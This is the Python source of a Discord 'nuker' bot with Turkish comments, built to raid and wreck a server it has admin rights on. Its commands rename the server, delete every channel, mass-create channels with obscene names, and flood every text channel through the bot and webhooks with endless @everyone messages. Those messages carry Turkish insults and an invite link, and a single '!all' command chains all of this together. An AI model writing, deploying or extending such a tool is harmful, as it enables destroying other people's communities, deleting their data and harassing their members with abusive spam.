import discord
from discord.ext import commands
import asyncio
import random
import io
import time
import os
# Tüm varsayılan niyetleri etkinleştirin
intents = discord.Intents.default()
intents.members = True  # Üye olaylarını dinlemek için
intents.message_content = True  # Mesaj içeriğini okumak için

# Botu oluştur
bot = commands.Bot(command_prefix="!", intents=intents)


# Kanal spam
@bot.command()
async def kspam(ctx, count: int = 100):
    tasks = []
    for _ in range(count):
        try:
            # asyncio.create_task ile görevi oluştur
            task = asyncio.create_task(ctx.guild.create_text_channel(name=f"💥💥💥💥💥-HACKER-SEKS-AH-ORUSPU"))
            tasks.append(task)
        except discord.HTTPException as e:
            print(f"Kanal oluşturma hatası: {e}")

    try:
        # Toplu olarak kanallar oluştur
        await asyncio.gather(*tasks)
        await ctx.send(f"{count} kanal oluşturuldu.")
    except Exception as e:
        print(f"Toplu işlem hatası: {e}")

# Kanal silme
@bot.command()
async def delete(ctx):
    """Tüm kanalları siler."""
    try:
        # Tüm kanalları bir listeye kaydet
        channels = ctx.guild.channels
        # API sınırlarını aşmamak için her 10 kanalda 1 saniye bekleme süresi
        bekleme_suresi = 1  # saniye
        kanal_sayisi = 500  # her beklemede kaç kanal silinecek
        # Tüm kanalları silmek için döngü
        for i in range(0, len(channels), kanal_sayisi):
            # Silinecek kanalları seç
            silinecek_kanallar = channels[i:i+kanal_sayisi]
            # Kanalları sil
            delete_tasks = [channel.delete() for channel in silinecek_kanallar]
            await asyncio.gather(*delete_tasks)
            # Bekleme süresi
            await asyncio.sleep(bekleme_suresi)
    except discord.HTTPException as e:
        await ctx.send(f"Kanal silmede hata: {e}")
    except Exception as e:
        await ctx.send(f"Beklenmedik hata: {e}")

@bot.command()
async def everspam12(ctx, mesaj: str = "@everyone amk çocugu ananı sikim ben senın"):
    # Tüm kanalları bir listeye kaydet
    kanallar = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]

    while True:
        tasks = []
        for kanal in kanallar:
            tasks.append(kanal.send(mesaj))

        try:
            # Toplu olarak mesajları gönder
            await asyncio.gather(*tasks)
        except Exception as e:
            print(f"Toplu işlem hatası: {e}")

        # 1 saniye bekle
        await asyncio.sleep(5)

@bot.command()
async def spam12(ctx):
    try:
        # Tüm kanalları bir listeye kaydet
        kanallar = [channel for channel in ctx.guild.channels if isinstance(channel, discord.TextChannel)]

        # Her kanala webhook oluştur
        webhooklar = []
        for _ in range(len(kanallar)): # Tüm kanallar için döngü
            try:
                # Rastgele bir kanal seç
                kanal = random.choice(kanallar)
                webhook = await kanal.create_webhook(name="İLK CLASS İLK SIRASI")
                webhooklar.append(webhook)

                # Toplu mesaj gönderme (örneğin, 10 mesaj bir seferde)
                for i in range(5):
                    tasks = [webhook.send("💥 @everyone  https://discord.gg/qww7hTPe 💥") for _ in range(i, min(i+10, 20))]
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(0.5) # API'yi aşırı yüklememek için kısa bir gecikme

                # Webhook'u sil
                await webhook.delete()

                # Yeni webhook oluştur
                webhook = await kanal.create_webhook(name="CLASS BOTS SEKS BOM!")

            except discord.HTTPException as e:
                print(f"Webhook oluşturma veya silme hatası: {e}")

        await ctx.send("İşlem tamamlandı.")

    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

# Sunucu adını değiştir
@bot.command()
async def servername(ctx):
    try:
        await ctx.guild.edit(name="!CLASS BOTU!")
    except discord.HTTPException as e:
        await ctx.send(f"Sunucu adını değiştirmede hata: {e}")


# Spam tetikleyicisi
@bot.command()
async def spam(ctx):
    try:
        await asyncio.gather(
            everspam12(ctx),
            spam12(ctx),
        )
        await ctx.send("İşlem tamamlandı.")
    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

# Sunucu adı ve fotoğrafını değiştirme
@bot.command()
async def server(ctx):
    try:
        await servername(ctx)
        await ctx.send("İşlem tamamlandı.")
    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

# "ALL" komutu
@bot.command()
async def all(ctx):
    try:
        await server(ctx)
        await delete(ctx)
        await kspam(ctx)
        await spam(ctx)
        await ctx.send("İşlem tamamlandı.")
    except discord.HTTPException as e:
        await ctx.send(f"İşlem sırasında hata oluştu: {e}")

# Botun yardımı
@bot.command()
async def a(ctx):
    await ctx.author.send("Kullanılabilir komutlar:Uyarı Benim Yetkim Tam Olması Lazım\n"
                           "- `!all Tüm Özeliki Kullanır]`\n"
                           "- `!kspam [250 Kanal Yapa]`\n"
                           "- `!delete [Tüm Kanal Sile Text]`\n"
                           "- `!spam [Webhook Ve Bot He Kanala Spam Yapa]`\n"
                           "- `!server Sunucu Adı Değişir`")

# Ban komutunu tanımlayın
# Ban komutunu tanımlayın


# Botu başlatmak için fonksiyon
def start_bot(tokens):
    bot.run(tokens)
